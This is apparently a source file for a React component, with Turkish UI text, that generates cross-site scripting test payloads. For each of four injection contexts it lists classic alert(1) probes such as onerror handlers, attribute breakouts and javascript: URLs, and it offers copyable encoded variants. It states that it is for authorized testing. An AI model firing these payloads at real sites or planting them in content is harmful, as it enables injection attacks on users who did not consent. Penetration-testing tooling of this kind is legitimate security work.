import { useState } from 'react';
import { copyText } from './copy';

// XSS ureteci — yansima baglami + ozel payload -> 4 kodlamada varyant.
// Uretim tamamen istemcide; testlerini YETKILI oldugun sistemlerde yap.
const htmlEnc = (s: string) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;');
const urlEnc = (s: string) => encodeURIComponent(s);
const uniEnc = (s: string) => [...s].map((c) => (c.charCodeAt(0) > 127 || '<>"\'()'.includes(c) ? `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}` : c)).join('');

const BASE: Record<string, string[]> = {
  body: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '<details open ontoggle=alert(1)>'],
  attr: ['" onmouseover=alert(1) x="', "' autofocus onfocus=alert(1) x='", '"><script>alert(1)</script>'],
  js: ["';alert(1);//", '</script><script>alert(1)</script>', '`-alert(1)-`'],
  url: ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html,<script>alert(1)</script>'],
};

const CTX: Record<string, string> = { body: 'HTML govde', attr: 'Etiket ozelligi', js: 'JS string ici', url: 'URL / yonlendirme' };

export default function XssGenerator() {
  const [ctx, setCtx] = useState('body');
  const [custom, setCustom] = useState('');
  const [copied, setCopied] = useState<string | null>(null);

  const payloads = [...(custom.trim() ? [custom.trim()] : []), ...BASE[ctx]];
  const variants = (p: string) => [
    { k: 'ham', v: p },
    { k: 'html', v: htmlEnc(p) },
    { k: 'url', v: urlEnc(p) },
    { k: 'unicode', v: uniEnc(p) },
  ];

  const copy = async (v: string) => {
    if (await copyText(v)) { setCopied(v); setTimeout(() => setCopied(null), 1000); }
  };

  return (
    <div className="rounded-2xl border border-[#1E1E1E] bg-[#0A0A0A] p-5">
      <h3 className="text-[14px] font-bold text-white">XSS Payload Üreteci</h3>
      <p className="mt-1 text-[12px] text-[#888]">Yansıma bağlamını seç, kodlanmış varyantları kopyala. Sadece yetkili testlerde.</p>
      <div className="mt-3 flex flex-wrap gap-2">
        {Object.entries(CTX).map(([k, label]) => (
          <button key={k} onClick={() => setCtx(k)}
            className={`rounded-full border px-3 py-1 text-[12px] ${ctx === k ? 'border-[#FF9F0A] bg-[#FF9F0A]/10 text-white' : 'border-[#2A2A2A] text-[#AAA] hover:text-white'}`}>
            {label}
          </button>
        ))}
      </div>
      <input value={custom} onChange={(e) => setCustom(e.target.value)} placeholder="ozel payload (opsiyonel)" aria-label="Ozel XSS payload"
        className="mt-3 w-full rounded-lg border border-[#2A2A2A] bg-[#1A1A1A] px-3 py-2 font-mono text-[12px] text-white placeholder-[#555] outline-none focus:border-[#FF9F0A]" />
      <div className="mt-3 max-h-64 space-y-3 overflow-y-auto">
        {payloads.map((p) => (
          <div key={p} className="rounded-lg bg-[#141414] p-2">
            <p className="truncate px-1 font-mono text-[12px] text-white" title={p}>{p}</p>
            <div className="mt-1 flex flex-wrap gap-1.5">
              {variants(p).map(({ k, v }) => (
                <button key={k} onClick={() => copy(v)}
                  className="rounded border border-[#2A2A2A] px-2 py-0.5 font-mono text-[11px] text-[#AAA] hover:text-white">
                  {copied === v ? '✓' : k}
                </button>
              ))}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}
